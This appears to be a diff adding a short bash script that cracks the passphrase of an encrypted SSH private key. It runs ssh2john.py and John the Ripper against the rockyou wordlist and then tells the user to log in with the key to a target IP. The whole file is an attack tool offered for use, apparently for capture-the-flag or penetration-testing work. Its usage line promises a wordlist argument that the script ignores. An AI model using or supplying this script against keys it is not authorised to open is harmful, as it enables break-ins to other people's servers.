@@ -1,0 +1,21 @@
+#!/bin/bash
+
+echo 'Usage : ./ssh_cracker PatH_To_Hash Path_To_WOrdList'
+echo ''
+
+id_rsa=$1
+echo 'creating hash file'
+echo ''
+CUR_DIR=$(pwd)
+python /usr/share/john/ssh2john.py $id_rsa > $CUR_DIR/hash_file_unique
+echo 'cracking hash'
+echo ''
+john --wordlist=/usr/share/wordlists/rockyou.txt $CUR_DIR/hash_file_unique
+
+rm $CUR_DIR/hash_file_unique
+
+chmod 700 $id_rsa
+
+echo ''
+echo 'cracking Finish Now you can use ssh -i id_rsa usearname@ip'
+
